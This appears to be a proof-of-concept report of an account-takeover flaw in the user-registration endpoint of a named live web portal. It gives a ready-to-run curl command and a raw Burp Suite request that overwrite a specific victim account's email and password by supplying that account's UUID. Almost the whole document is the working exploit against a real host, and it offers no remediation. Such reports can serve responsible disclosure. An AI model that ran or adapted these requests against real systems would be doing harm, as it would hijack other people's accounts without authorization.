# Description
This request exploits an ID-based account takeover via an upsert vulnerability on the POST /user-management/user registration endpoint. By supplying the target's UUID (a4ce79d4-2f16-4cac-a29b-b6293c865317) in the request body along with attacker-controlled credentials (bnew/bnew@gmail.com/bnew), the server overwrites the victim's email and password hash while preserving other account attributes — effectively hijacking the account without any authentication or prior authorization.

# cURL command

curl -i -s -X POST "https://portal.skillab-project.eu/user-management/user" \
  -H "Host: portal.skillab-project.eu" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Referer: https://portal.skillab-project.eu/register" \
  -H "Content-Type: application/json" \
  -H "Origin: https://portal.skillab-project.eu" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Priority: u=0" \
  -H "Connection: keep-alive" \
  --compressed \
  -d '{"id":"a4ce79d4-2f16-4cac-a29b-b6293c865317","name":"bnew","email":"bnew@gmail.com","password":"bnew","address":"","portfolio":""}'

# Burp Suite Request

POST /user-management/user HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.skillab-project.eu/register
Content-Type: application/json
Content-Length: 134
Origin: https://portal.skillab-project.eu
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{
"id":"a4ce79d4-2f16-4cac-a29b-b6293c865317",
"name":"bnew",
"email":"bnew@gmail.com",
"password":"bnew",
"address":"",
"portfolio":""
}